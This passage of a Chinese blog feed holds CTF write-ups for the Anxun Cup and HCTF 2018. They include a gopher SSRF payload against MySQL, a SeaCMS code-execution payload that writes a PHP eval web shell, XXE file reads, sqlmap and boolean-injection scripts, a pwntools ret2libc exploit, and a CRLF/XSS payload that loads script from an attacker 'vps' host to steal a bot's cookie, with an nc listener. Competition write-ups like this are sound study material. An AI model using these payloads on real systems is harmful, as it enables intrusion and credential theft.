alt=""></p><pre><code>gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239095.9827178.jpg" alt=""></p><p>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p><h3 id="BOOM"><a href="#BOOM" class="headerlink" title="BOOM"></a>BOOM</h3><p>御剑扫目录</p><p>robots.txt和/admin/login.html，robots.txt里有/readme_.html，拿到了管理员用户名和错的密码</p><p>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239108.3526225.jpg" alt=""><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239118.7877207.jpg" alt="">登录拿flag</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239138.7812676.jpg" alt=""></p><p>70e052657cb40cf142883abaff266fee</p><h3 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h3><p><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a></p><pre><code>http://138.68.2.14/seacms/search.phppost:searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</code></pre><p>写shell</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php%20@eval($_POST[c])?&gt;&#39;);</code></pre><p>提示.git泄露，用工具读出源码吧</p><p>\data\ common.inc.php有配置信息</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239162.399129.jpg" alt=""></p><p>直接写sql语句读取flag</p><pre><code>http://138.68.2.14/seacms/search.phpsearchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($Misplaced &amp;_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=$con =mysql_connect(&quot;localhost&quot;,&quot;d0g3&quot;,&quot;FlagIsHere&quot;);mysql_select_db(&quot;flag&quot;, $con);$result = mysql_query(&quot;SELECT * from flag&quot;);$row = mysql_fetch_array($result);var_dump($row);</code></pre><h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p><a href="https://mp.weixin.qq.com/s/iLJEdzJSQD5cv66AftbJ3A" target="_blank" rel="external">https://mp.weixin.qq.com/s/iLJEdzJSQD5cv66AftbJ3A</a></p><p>Host: 45.77.200.106</p><p>思路是在忘记密码处，填入管理员账户<code>admin</code>，重置管理员账号密码，然后登录管理员账号。</p><p>但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了</p><p>登录后还有一个输入框，任意提交一个字符串后抓包发现</p><pre><code class="xaml">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</code></pre><p>xxe无误，直接读取文件</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY myentity SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot; &gt;]&gt;&lt;information&gt;&lt;username&gt;&amp;myentity;&lt;/username&gt;&lt;/information&gt;</code></pre><p>拿到flag的base64编码</p><pre><code>PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==</code></pre><h3 id="simple-sqli"><a href="#simple-sqli" class="headerlink" title="simple sqli"></a>simple sqli</h3><p>一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入</p><pre><code>sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell</code></pre><p>当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo</p><p>直接读取flag</p><pre><code>select load_file(&#39;/www/sqli/secret.php&#39;)</code></pre><p>base64解码后就是flag</p><pre><code>D0g3{iaown_oiasnd_asdasda}</code></pre><h3 id="webN中国"><a href="#webN中国" class="headerlink" title="webN中国"></a>webN中国</h3><p><a href="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/" target="_blank" rel="external">https://michaelwayneliu.github.io/2017/12/21/SOME攻击/</a></p><p><strong>webN**</strong>（<strong><strong>400</strong></strong>）**</p><p>题目：<br> 你们点的大餐<br> <a href="http://222.18.158.245:6080/" target="_blank" rel="external">http://222.18.158.245:6080/</a></p><p>tip：Some攻击<br> tip2：为什么不问问富萝莉客服呢？虽然她有点傲娇<br> hint: <a href="https://pan.baidu.com/s/1F93XXi68eqU1uw_Pl7_kfQ" target="_blank" rel="external">https://pan.baidu.com/s/1F93XXi68eqU1uw_Pl7_kfQ</a> 提取码：tv5y</p><p>confirm.php 存在jsonp操作，可控，直接修改网上脚本，父页面执行pay方法<br> <img src="http://phxj316sb.bkt.clouddn.com/674czxvs06mhow3873eahuuq2r.png" alt="img"></p><p>poc:</p><pre><code class="javascript">&lt;iframe src=&quot;http://222.18.158.245:6080/reward.php&quot; name=b&gt;&lt;/iframe&gt;        &lt;iframe name=a&gt;&lt;/iframe&gt;        &lt;script&gt;        window.frames[0].open(&#39;http://222.18.158.245:6080/confirm.php&#39;,&#39;a&#39;);        setTimeout(          function(){            window.frames[1].location.href = &#39;http://222.18.158.245:6080/confirm.php?callback=window.opener.pay&#39;;          }        ,1000);&lt;/script&gt;</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239180.9615023.jpg" alt=""><br> 获取到flag：D0g3{Same_Orig1n_Method_ExCute_1s_eAsy}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="巴西-neko（200）"><a href="#巴西-neko（200）" class="headerlink" title="巴西-neko（200）"></a><strong>巴西-neko（200）</strong></h3><p>第一次两次溢出泄露got任意两个函数的地址去查libc版本，找到/bin/sh的偏移，system函数有就很简单了<br>第二次启shell，栈溢出的题目的一般方法</p><pre><code class="python">#!/usr/bin/pythonfrom pwn import *context(log_level = &quot;debug&quot;, os = &quot;linux&quot;, arch = &quot;i386&quot;)elf = &quot;./neko&quot;#LIBC = &quot;libc64.so&quot;elf = ELF(elf)libc = elf.libctar = remote(&#39;149.248.7.48&#39;,9999)#-----------------------------------------------------------------def dbg(script = &quot;&quot;, elf = elf, arch = &quot;amd64&quot;):    gdb.attach(tar, gdbscript = script)def sh():    tar.interactive()#-----------------------------------------------------------------system = elf.plt[&quot;system&quot;]puts = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]puts_off = 0x05f140binsh_off = 0x15902bvuln = 0x080486E7#-----------------------------------------------------------------tar.sendlineafter(&quot;cats?\n&quot;,&#39;y&#39;)pl = &#39;&#39;pl += &#39;1&#39; * 0xd4pl += p32(puts)pl += p32(vuln)pl += p32(puts_got)tar.sendafter(&quot;anchovies:\n&quot;,pl)tar.recvline()libc_base = u32(tar.recv(4)) - puts_offbinsh = libc_base + binsh_offsuccess(&quot;libc base : &quot;+hex(libc_base))pl = &#39;&#39;pl += &#39;1&#39; * 0xd4pl += p32(system)pl += p32(binsh) * 2tar.sendafter(&quot;anchovies:\n&quot;,pl)sh()</code></pre><h3 id="哈萨克-hiahiahia（200-）"><a href="#哈萨克-hiahiahia（200-）" class="headerlink" title="哈萨克**-hiahiahia（200**）"></a><strong>哈萨克**</strong>-hiahiahia<strong><strong>（</strong></strong>200<strong>**）</strong></h3><p>很简单的一个题目，和oj上的一个类似，溢出覆盖arg[0]利用stack-chk-fail打印flag。。。懒到不想写脚本<br> <img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239197.2212636.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一届安洵杯writeup&quot;&gt;&lt;a href=&quot;#第一届安洵杯writeup&quot; class=&quot;headerlink&quot; title=&quot;第一届安洵杯writeup&quot;&gt;&lt;/a&gt;第一届安洵杯writeup&lt;/h1&gt;&lt;h2 id=&quot;MIsc&quot;&gt;&lt;a href=&quot;#MIsc&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="http://Bigbroke.com/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://Bigbroke.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018-web writeup</title>
    <link href="http://Bigbroke.com/archis/4341f801/"/>
    <id>http://Bigbroke.com/archis/4341f801/</id>
    <published>2018-11-13T05:26:20.000Z</published>
    <updated>2018-11-14T05:30:24.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只做出两道惭愧，复现学一下。</p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><img src="/archis/4341f801/1541944707375.png" alt="1541944707375"></p><p><img src="/archis/4341f801/1541944804344.png" alt="1541944804344"></p><p>右键源码提示存在source.php</p><p>点进去查看源码</p><pre><code>&lt;?php    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt;</code></pre><p>hint点进去知道flag在 ffffllllaaaagggg<img src="/archis/4341f801/1541944745955.png" alt="1541944745955"></p><p>出现问题的代码：</p><pre><code class="php">$_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }</code></pre><p>如果让source.php%253f/../../../../../../../ffffllllaaaagggg。其中source.php是whitelist里面的文件 ，<code>253f</code>是?的双重<code>urlencode.php</code>会自动进行一次urldecode，php会将source.php%253f/当成一个目录，所以需要多加一个../来包含我们可控的文件。</p><p><a href="http://warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../../ffffllllaaaagggg" target="_blank" rel="external">http://warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../../ffffllllaaaagggg</a></p><p>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</p><p>参考文章：</p><p><a href="https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#3-phpMyAdmin-4-8-1-getshell-%E5%AE%9E%E6%88%98" target="_blank" rel="external">https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#3-phpMyAdmin-4-8-1-getshell-%E5%AE%9E%E6%88%98</a></p><h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>www.zip泄露</p><p>审计</p><p>在member.php有cookie注入，而且每个页面都包含了member.php</p><pre><code class="php">if (isset($_COOKIE[&quot;islogin&quot;])) {    if ($_COOKIE[&quot;login_data&quot;]) {        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);        $admin_user = $login_data[&#39;admin_user&#39;];        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>直接从<code>$_COOKIE</code>中取的数据，并且直接拼接到了SQL语句中</p><pre><code class="sql">$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>通过json_decode+php弱类型可以绕过登录鉴权admin，然后以这个来做标记来bool注入</p><pre><code class="python">#coding:utf-8import requestsurl = &quot;http://kzone.2018.hctf.io/admin/list.php&quot;cookies = {    &quot;_ga&quot;: &quot;GA1.2.1556483061.1541786955&quot;,    &quot;_gid&quot;: &quot;GA1.2.140952073.1541786955&quot;,    &quot;PHPSESSID&quot;: &quot;72m84deran77afu36is1dbi3k7&quot;,    &quot;islogin&quot;: &quot;1&quot;}#payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))))and'1","admin_pass":65}}&#39;&#39;&#39;#payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;#payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))))and'1","admin_pass":65}}&#39;&#39;&#39;#payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(f1a9)from(F1444g)))))and'1","admin_pass":65}}&#39;&#39;&#39; #字段名是试出来的payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(f1a9)from(F1444g)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;get = &quot;&quot;for i in xrange(50):    for j in xrange(32, 127):        data = payload1.format(get, chr(j))        cookies[&quot;login_data&quot;] = data        r = requests.get(url, cookies = cookies)        if &quot;Fish&quot; in r.content:            data = payload2.format(get, chr(j))            cookies[&quot;login_data&quot;] = data            r = requests.get(url, cookies = cookies)            if &quot;Fish&quot; not in r.content:                get += chr(j)                print get                break</code></pre><p>hctf{4526a8cbd741b3f790f95ad32c2514b9}</p><p><a href="https://www.anquanke.com/post/id/163958#h2-0" target="_blank" rel="external">https://www.anquanke.com/post/id/163958#h2-0</a></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>走了很多弯路 上传js会解析 可以xss 但没有作用</p><p>后来发现文章<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="external">https://xz.aliyun.com/t/2589</a></p><p>用zip 压缩软连接读环境变量</p><p>ln -s /etc/profile  profile<br>zip -y profile.zip profile </p><p><code>/proc/self/environ</code>，能读到uwsgi配置文件</p><pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=7d8beb1a9aa4SHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><p>当前进程的工作目录在<code>/app/hard_t0_guess_n9f5a95b5ku9fg</code><br>UWSGI配置文件在<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code><br>软连接读取配置文件</p><p> ln -s /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini ini<br> zip -y ini.zip ini</p><pre><code>module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</code></pre><p>发现主文件<code>app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code><br>接着软连接读项目源码</p><p> ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py mainpy<br> zip -y mainpy.zip mainpy</p><p><img src="/archis/4341f801/1542008448450.png" alt="1542008448450"></p><p>直接打开没换行。查看源码就可以换行版本 代码如下：</p><pre><code class="python"># -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024ALLOWED_EXTENSIONS = set([&#39;zip&#39;])def allowed_file(filename):    return &#39;.&#39; in filename and \           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def index():    error = request.args.get(&#39;error&#39;, &#39;&#39;)    if(error == &#39;1&#39;):        session.pop(&#39;username&#39;, None)        return render_template(&#39;index.html&#39;, forbidden=1)    if &#39;username&#39; in session:        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)    else:        return render_template(&#39;index.html&#39;)@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])def login():    username=request.form[&#39;username&#39;]    password=request.form[&#39;password&#39;]    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:        if(username == &#39;admin&#39;):            return redirect(url_for(&#39;index&#39;,error=1))        session[&#39;username&#39;] = username    return redirect(url_for(&#39;index&#39;))@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])def logout():    session.pop(&#39;username&#39;, None)    return redirect(url_for(&#39;index&#39;))@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])def upload_file():    if &#39;the_file&#39; not in request.files:        return redirect(url_for(&#39;index&#39;))    file = request.files[&#39;the_file&#39;]    if file.filename == &#39;&#39;:        return redirect(url_for(&#39;index&#39;))    if file and allowed_file(file.filename):        filename = secure_filename(file.filename)        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)        if(os.path.exists(file_save_path)):            return &#39;This file already exists&#39;        file.save(file_save_path)    else:        return &#39;This file is not a zipfile&#39;    try:        extract_path = file_save_path + &#39;_&#39;        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)        file = read_obj.read()        read_obj.close()        os.system(&#39;rm -rf &#39; + extract_path)    except Exception as e:        file = None    os.remove(file_save_path)    if(file != None):        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error=1))    return Response(file)if __name__ == &#39;__main__&#39;:    #app.run(debug=True)    app.run(host=&#39;127.0.0.1&#39;, debug=True, port=10008)</code></pre><p>查看源码发现引用了<code>flag.py</code>，但是不能直接读<code>flag.py</code>，因为里面<code>hctf</code>字样的flag会被如下代码过滤掉</p><pre><code class="python">if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error=1))</code></pre><p>读了templates/index.html，发现用户名为admin的时候才会输出flag</p><pre><code>ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html indexzip -y index.zip index</code></pre><p><img src="/archis/4341f801/1542010367267.png" alt="1542010367267"></p><p>所有 要读secret，伪造admin的session</p><p>注意到</p><pre><code class="python">random.seed(uuid.getnode())app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)</code></pre><p><code>getnode()</code>和MAC地址有关所以服务器的<code>SECRET_KEY</code>固定,软连接读<code>ln -s /sys/class/net/eth0/address</code>得到MAC<code>12:34:3e:14:7c:62</code></p><p><img src="/archis/4341f801/1542011957802.png" alt="1542011957802"></p><p>算出secret key伪造脚本</p><pre><code>random.seed(20015589129314)print str(random.random()*100)</code></pre><p>得到secret_key=11.935137566861131</p><p>伪造session</p><pre><code>eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk</code></pre><p><img src="/archis/4341f801/1542011873105.png" alt="1542011873105"></p><p>读文件/proc/self/environ</p><p><img src="/archis/4341f801/1541901100521.png" alt="1541901100521"></p><pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>查看源代码泄露</p><p><img src="/archis/4341f801/1542046574284.png" alt="1542046574284"></p><p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="external">https://github.com/woadsl1234/hctf_flask/</a></p><p>下载代码审计</p><p>只有登录注册修改密码，猜测题意需要登录admin才可以。</p><pre><code>def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>题目的要点是成为 admin，然后看到题目提供了修改 password 的操作，而且用来检查的 name 是用户可控的。</p><p>谷歌strlower函数，这个函数在处理unicode字符时有一些问题，例如\u1d35即ᴵ，经过这个函数会变成大写字母I，然后再调用一下就会变成小写字母i，所以思路就明显了。</p><p><a href="http://blog.lnyas.xyz/?p=1411和题目非常类似，" target="_blank" rel="external">http://blog.lnyas.xyz/?p=1411和题目非常类似，</a></p><p>注册一个<code>ᴬᴰᴹᴵᴺ</code>然后修改密码，就可以用admin登录了。</p><p><img src="/archis/4341f801/1542045086966.png" alt="1542045086966"></p><p>hctf{un1c0dE_cHe4t_1s_FuNnying}</p><h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>登陆抓包发现有一个path路由存在302跳转</p><p><img src="/archis/4341f801/1542095165476.png" alt="1542095165476"></p><p>发现存在CRLF注入，</p><pre><code>GET /path?path=http://bottle.2018.hctf.io/user%0d%0a%0d%0a&lt;html&gt;Bigbroke&lt;/html&gt;</code></pre><p><img src="/archis/4341f801/1542095592837.png" alt="1542095592837"></p><p>需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用&lt;80端口可以绕过302跳转.。参考用p师傅的方法：<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p><p>直接绕过CSP,user路径输入url，bot会去访问会去访问<br>因为CRLF，可以控制返回回来的信息，可以造成XSS<br>然后根据柠檬师傅的文章发现，0，21，22等端口可以绕过302跳转执行js<br>然后user里面输入</p><pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:20/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://vps/myjs/hctfcookie.js%3E%3C/script%3E</code></pre><p>得到bot session<br>替换登陆getflag<br>hctf{26372420de8d5c94f8fb007c4389841f}</p><p>方法二：</p><p><a href="http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:21/%0d%0a%0d%0a" target="_blank" rel="external">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:21/%0d%0a%0d%0a</a><a href="script%20src%3dhttp://vps:2333">script%20src%3dhttp://vps:2333</a></p><p>nc -lvvv 2333</p><p>另外附搭建xss平台：<a href="https://blog.csdn.net/itest_2016/article/details/77650356" target="_blank" rel="external">https://blog.csdn.net/itest_2016/article/details/77650356</a></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>题目的要求是登录到id=1，用户名为admin的用户后访问/web2/flag.php。</p><p><a href="http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序" target="_blank" rel="external">http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序</a> 我们可以不断注册新用户，密码逐位与admin的密码比较，最最终比较出来admin密码</p><p>注册一个密码为d的用户</p><p><img src="/archis/4341f801/1542077753170.png" alt="1542077753170"></p><p>然后按密码排序，发现它在admin下面</p><p>然后注册一个密码为e的用户，发现他在admin上面</p><p>由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为dsa8&amp;&amp;!@#$%^&amp;d1ngy1as3dja，登录访问flag.php即可getflag。</p><p><img src="/archis/4341f801/1542078024341.png" alt="1542078024341"></p><p>hctf{this_idea_h1t_me_whil3_I_am_W3rking}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;只做出两道惭愧，复现学一下。&lt;/p&gt;
&lt;h2 id=&quot;warmup&quot;&gt;&lt;a href=&quot;#warmup&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="CTF" scheme="http://Bigbroke.com/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://Bigbroke.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>docker复现ctf&amp;dockerfile编写ctf环境</title>
    <link href="http://Bigbroke.com/archis/47a94ec3/"/>
    <id>http://Bigbroke.com/archis/47a94ec3/</id>
    <published>2018-10-29T13:57:39.000Z</published>
    <updated>2018-11-02T13:52:11.936Z</updated>
    
